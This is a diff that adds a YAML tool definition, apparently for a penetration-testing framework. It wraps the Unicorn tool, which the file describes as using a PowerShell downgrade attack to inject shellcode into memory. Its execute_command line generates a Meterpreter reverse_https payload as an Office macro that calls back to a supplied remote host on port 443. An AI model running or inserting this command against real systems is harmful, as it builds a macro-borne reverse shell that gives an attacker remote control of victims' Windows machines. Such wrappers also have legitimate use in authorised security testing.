@@ -1,0 +1,17 @@
+name: unicorn
+description: >
+ Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18.
+author: "www.trustedsec.com"
+version: "1.0"
+enabled: true
+params:
+  - name: rhost
+    type: string
+    required: true
+    description: Remote host.
+tool:
+  name: unicorn
+  repo_url: https://github.com/trustedsec/unicorn.git
+  install_path: external/.exploit/unicorn
+  execute_command: |
+    python unicorn.py windows/meterpreter/reverse_https {rhost} 443 macro 500
